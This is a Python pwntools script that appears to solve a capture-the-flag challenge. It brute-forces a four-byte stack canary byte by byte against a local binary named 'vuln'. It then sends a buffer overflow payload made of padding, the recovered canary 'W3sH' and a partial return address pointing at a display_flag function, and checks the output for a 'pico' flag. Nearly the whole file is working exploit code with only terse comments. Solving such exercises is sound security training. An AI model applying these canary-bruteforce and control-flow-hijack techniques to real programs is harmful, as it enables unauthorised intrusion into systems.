from pwn import *

elf = ELF("./vuln")
proc = process("./vuln")

context.log_level = "error"

#pad = "A" * 32
#canary = ""

# Canary incremental bruteforce
def canary_bruteforce():
    pad = "A" * 32
    canary = ""

    while True:
        for x in range(0, 256):
            payload = pad + canary + chr(x)
            input_len = len(payload)

            proc = process("./vuln")
            proc.sendlineafter(">", str(input_len))
            proc.sendlineafter("Input>", payload)
            answer = proc.recvall()

            if "*** Stack Smashing Detected *** : Canary Value Corrupt!" in str(answer):
                continue
            else:
                canary += chr(x)
                print("Canary found (char nÂ°" + str(len(canary)) + "):    " + str(canary))
                if len(canary) == 4:
                    return(canary)

# Overflow and instruction pointer hijhack
# 0x000007ed  display_flag
# pad + 16 before EIP 

#canary = canary_bruteforce()
canary = "W3sH"
payload = ""
payload += "A" * 32
payload += canary
payload += "A" * 16
payload += "\xed\x07"
proc = process("./vuln")
proc.sendlineafter(">", str(len(payload)))
proc.sendlineafter("Input>", payload)
answer = proc.recvall(timeout = 1)
print(answer)
if "pico" in str(answer):
    print(answer)


